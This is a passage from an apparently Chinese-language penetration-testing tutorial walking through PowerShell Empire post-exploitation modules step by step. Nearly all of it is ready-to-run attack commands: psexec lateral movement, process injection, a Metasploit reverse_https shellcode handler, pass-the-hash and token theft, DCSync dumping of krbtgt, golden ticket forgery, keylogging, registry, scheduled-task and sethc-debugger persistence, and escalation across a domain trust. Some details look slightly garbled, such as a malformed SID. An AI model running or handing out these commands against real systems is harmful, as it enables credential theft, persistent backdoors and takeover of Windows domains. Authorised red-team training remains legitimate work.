### **5.9 使用Psexec模块进行横向移动以生成反弹代理**

1. 选择并加载 `lateral_movement/invoke_psexec` 模块。
    ```bash
    (Empire: S4DU3VSRKR3U1DDF) > usemodule lateral_movement/invoke_psexec
    ```
2. 查看模块信息。
    ```bash
    (Empire: lateral_movement/invoke_psexec) > info
    ```
3. 设置监听器和目标计算机名称。
    ```bash
    (Empire: lateral_movement/invoke_psexec) > set Listener test
    (Empire: lateral_movement/invoke_psexec) > set ComputerName SCAN03
    ```
4. 执行模块。
    ```bash
    (Empire: lateral_movement/invoke_psexec) > execute
    ```

### **5.10 通过会话注入获取反弹代理**

1. 与特定的代理交互。
    ```bash
    (Empire: agents) > interact YU3NGBFBPGZTV1DD
    ```
2. 列出当前进程。
    ```bash
    (Empire: YU3NGBFBPGZTV1DD) > ps cmd
    ```
3. 选择并加载 `management/psinject` 模块。
    ```bash
    (Empire: YU3NGBFBPGZTV1DD) > usemodule management/psinject
    ```
4. 查看模块信息。
    ```bash
    (Empire: management/psinject) > info
    ```
5. 设置注入的目标进程ID（建议使用 `lass.exe` 对应的进程）和监听器。
    ```bash
    (Empire: management/psinject) > set ProcId 6536
    (Empire: management/psinject) > set Listener test
    ```
6. 执行模块。
    ```bash
    (Empire: management/psinject) > execute
    ```

### **5.11 Empire 和 Metasploit 的联动**

**在 Empire 终端执行：**
1. 与特定的代理交互。
    ```bash
    (Empire: agents) > interact XCLLHZZPAWPN1REL
    ```
2. 选择并加载 `code_execution/invoke_shellcode` 模块。
    ```bash
    (Empire: XCLLHZZPAWPN1REL) > usemodule code_execution/invoke_shellcode
    ```
3. 查看模块信息。
    ```bash
    (Empire: code_execution/invoke_shellcode) > info
    ```
4. 设置本地主机 IP 和端口。
    ```bash
    (Empire: code_execution/invoke_shellcode) > set Lhost 10.0.0.86
    (Empire: code_execution/invoke_shellcode) > set Lport 4433
    ```
5. 执行模块。
    ```bash
    (Empire: code_execution/invoke_shellcode) > execute
    ```

**在 Metasploit 终端执行（假设在同一主机上）：**
1. 选择并加载 `exploit/multi/handler` 模块。
    ```bash
    msf > use exploit/multi/handler
    ```
2. 设置载荷、本地主机 IP 和端口，并设置退出会话选项。
    ```bash
    msf exploit(handler) > set payload windows/meterpreter/reverse_https
    msf exploit(handler) > set lhost 10.0.0.86
    msf exploit(handler) > set lport 4433
    msf exploit(handler) > set exitsession false
    ```
3. 开始监听。
    ```bash
    msf exploit(handler) > exploit -j
    ```

### **5.12 Pass the Hash (PTH)**

1. 列出凭据。
    ```bash
    (Empire: XCLLHZZPAWPN1REL) > creds
    ```
2. 使用指定的凭据 ID 进行 PTH。
    ```bash
    (Empire: XCLLHZZPAWPN1REL) > pth 7
    ```
3. 偷取令牌 PID。
    ```bash
    (Empire: XCLLHZZPAWPN1REL) > steal_token 12004
    ```
4. 访问目标权限的共享目录。
    ```bash
    (Empire: XCLLHZZPAWPN1REL) > dir \\SCAN03\c$
    ```
5. 恢复令牌权限到原来的状态。
    ```bash
    (Empire: XCLLHZZPAWPN1REL) > revtoself
    ```

### **5.13 使用 Psexec 模块进行横向渗透**

1. 选择并加载 `lateral_movement/invoke_psexec` 模块。
    ```bash
    (Empire: HPEUGGBSPSAPWGZW) > usemodule lateral_movement/invoke_psexec
    ```
2. 查看模块信息。
    ```bash
    (Empire: lateral_movement/invoke_psexec) > info
    ```
3. 设置目标计算机名称和监听器。
    ```bash
    (Empire: lateral_movement/invoke_psexec) > set ComputerName SCAN03.bk.com
    (Empire: lateral_movement/invoke_psexec) > set Listener test
    ```
4. 执行模块。
    ```bash
    (Empire: lateral_movement/invoke_psexec) > execute
    ```

### **5.14 获取域的 krbtgt 值**

1. 选择并加载 `credentials/mimikatz/dcsync` 模块。
    ```bash
    (Empire: EEDLABPF43FAGWHZ) > usemodule credentials/mimikatz/dcsync
    ```
2. 设置用户和查看模块信息。
    ```bash
    (Empire: credentials/mimikatz/dcsync) > set user dc2\krbtgt
    (Empire: credentials/mimikatz/dcsync) > info
    ```
3. 执行模块。
    ```bash
    (Empire: credentials/mimikatz/dcsync) > execute
    ```

### **5.15 创建 Golden Tickets**

1. 选择并加载 `credentials/mimikatz/golden_ticket` 模块。
    ```bash
    (Empire: EEDLABPF43FAGWHZ) > usemodule credentials/mimikatz/golden_ticket
    ```
2. 查看凭据并设置相关参数。
    ```bash
    (Empire: credentials/mimikatz/golden_ticket) > creds
    (Empire: credentials/mimikatz/golden_ticket) > set CredID 1
    (Empire: credentials/mimikatz/golden_ticket) > set user administrator
    ```
3. 执行模块。
    ```bash
    (Empire: credentials/mimikatz/golden_ticket) > execute
    ```
4. 清理黄金票据会话。
    ```bash
    (Empire: credentials/mimikatz/golden_ticket) > usemodule credentials/mimikatz/purge
    (Empire: credentials/mimikatz/golden_ticket) > execute
    ```

### **5.16 获取系统日志事件**

1. 选择并加载 `situational_awareness/host/computerdetails` 模块。
    ```bash
    (Empire: situational_awareness/network/reverse_dns) > usemodule situational_awareness/host/computerdetails
    ```
2. 查看模块信息。
    ```bash
    (Empire: situational_awareness/host/computerdetails) > info
    ```
3. 执行模块。
    ```bash
    (Empire: situational_awareness/host/computerdetails) > execute
    ```

### **5.17 收集目标主机有用的信息**

1. 与特定的代理交互。
    ```bash
    (Empire: agents) > interact EEDLABPF43FAGWHZ
    ```
2. 选择并加载 `situational_awareness/host/winenum` 模块。
    ```bash
    (Empire: EEDLABPF43FAGWHZ) > usemodule situational_awareness/host/winenum
    ```
3. 查看模块信息。
    ```bash
    (Empire: situational_awareness/host/winenum) > info
    ```
4. 执行模块。
    ```bash
    (Empire: situational_awareness/host/winenum) > execute
    ```

### **5.18 查看网络共享**

1. 选择并加载 `situational_awareness/network/stealth_userhunter` 模块。
    ```bash
    (Empire: EEDLABPF43FAGWHZ) > usemodule situational_awareness/network/stealth_userhunter
    ```
2. 查看模块信息。
    ```bash
    (Empire: situational_awareness/network/stealth_userhunter) > info
    ```
3. 执行模块。
    ```bash
    (Empire: situational_awareness/network/stealth_userhunter) > execute
    ```

### **5.19 桌面截屏和键盘记录**

1. 选择并加载 `collection/screenshot` 模块。
    ```bash
    (Empire: USSZC2P1XCTBKYGH) > usemodule collection/screenshot
    ```
2. 查看模块信息。
    ```bash
    (Empire: collection/screenshot) > info
    ```
3. 执行模块。
    ```bash
    (Empire: collection/screenshot) > execute
    ```
4. 选择并加载 `collection/keylogger` 模块。
    ```bash
    (Empire: collection/screenshot) > usemodule collection/keylogger
    ```
5. 查看模块信息。
    ```bash
    (Empire: collection/keylogger) > info
    ```
6. 执行模块。
    ```bash
    (Empire: collection/keylogger) > execute
    ```

### **5.20 权限持久性的注册表注入**

1. 选择并加载 `persistence/userland/registry` 模块。
    ```bash
    (Empire: EEDLABPF43FAGWHZ) > usemodule persistence/userland/registry
    ```
2. 查看模块信息。
    ```bash
    (Empire: persistence/userland/registry) > info
    ```
3. 设置监听器和注册表路径。
    ```bash
    (Empire: persistence/userland/registry) > set Listener bk
    (Empire: persistence/userland/registry) > set RegPath HKCU:Software\Microsoft\Windows\CurrentVersion\Run
    ```
4. 执行模块。
    ```bash
    (Empire: persistence/userland/registry) > execute
    ```

### **5.21 权限持久性的计划任务注册**

1. 选择并加载 `persistence/userland/schtasks` 模块。
    ```bash
    (Empire: WC1PKXFTA4KNTFN4) > usemodule persistence/userland/schtasks
    ```
2. 查看模块信息。
    ```bash
    (Empire: persistence/userland/schtasks) > info
    ```
3. 设置监听器、每日时间和注册表路径。
    ```bash
    (Empire: persistence/userland/schtasks) > set Listener bk
    (Empire: persistence/userland/schtasks) > set DailyTime 05:00
    (Empire: persistence/userland/schtasks) > set RegPath HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    ```
4. 执行模块。
    ```bash
    (Empire: persistence/userland/schtasks) > execute
    ```

### **5.22 权限持久性的 AD 用户触发**

1. 选择并加载 `persistence/powerbreach/deaduser` 模块。
    ```bash
    (Empire: AG2RV3CFLLY4PZZ4) > usemodule persistence/powerbreach/deaduser
    ```
2. 查看模块信息。
    ```bash
    (Empire: persistence/powerbreach/deaduser) > info
    ```
3. 设置用户名和监听器。
    ```bash
    (Empire: persistence/powerbreach/deaduser) > set Username DC2\test
    (Empire: persistence/powerbreach/deaduser) > set Listener bk
    ```
4. 执行模块。
    ```bash
    (Empire: persistence/powerbreach/deaduser) > execute
    ```

### **5.23 权限持久性劫持 Shift 后门**

1. 选择并加载 `lateral_movement/invoke_wmi_debugger` 模块。
    ```bash
    (Empire: ASMR14VVZG4A33AE) > usemodule lateral_movement/invoke_wmi_debugger
    ```
2. 查看模块信息。
    ```bash
    (Empire: lateral_movement/invoke_wmi_debugger) > info
    ```
3. 设置监听器、目标二进制文件和目标计算机名称。
    ```bash
    (Empire: lateral_movement/invoke_wmi_debugger) > set Listener bk
    (Empire: lateral_movement/invoke_wmi_debugger) > set TargetBinary sethc.exe
    (Empire: lateral_movement/invoke_wmi_debugger) > set ComputerName CLINCET2
    ```
4. 执行模块。
    ```bash
    (Empire: lateral_movement/invoke_wmi_debugger) > execute
    ```

### **6. 子域和父域的信任跳转**

1. 确认子域和父域的信任关系。
    ```bash
    (Empire: agents) > usemodule situational_awareness/network/powerview/get_domain_trust
    (Empire: situational_awareness/network/powerview/get_domain_trust) > info
    (Empire: situational_awareness/network/powerview/get_domain_trust) > execute
    ```
2. 获取父域的 `krbtgt` 账户 SID。
    ```bash
    (Empire: agents) > usemodule management/user_to_sid
    (Empire: management/user_to_sid) > set Domain lab.local
    (Empire: management/user_to_sid) > set Username krbtgt
    (Empire: management/user_to_sid) > execute
    ```
3. 获取子域 `krbtgt` 账户的哈希值。
    ```bash
    (Empire: agents) > usemodule credentials/mimikatz/dcsync
    (Empire: credentials/mimikatz/dcsync) > set User dev.lab.local\krbtgt
    (Empire: credentials/mimikatz/dcsync) > execute
    ```
4. 伪造父域管理员账号的黄金票据。
    ```bash
    (Empire: agents) > usemodule credentials/mimikatz/golden_ticket
    (Empire: credentials/mimikatz/golden_ticket) > set CredID 14
    (Empire: credentials/mimikatz/golden_ticket) > set user lolhax
    (Empire: credentials/mimikatz/golden_ticket) > set sids 95505cle3d98a458128845353b988
    (Empire: credentials/mimikatz/golden_ticket) > execute
    ```

### **三、Empire 总结**

通过一系列学习，我们可以看到 Empire 提供了丰富的功能模块，能够与 Metasploit 协同工作，进行强大的后渗透测试。它不仅支持权限持久性和横向渗透，还提供了对域环境的深入渗透能力。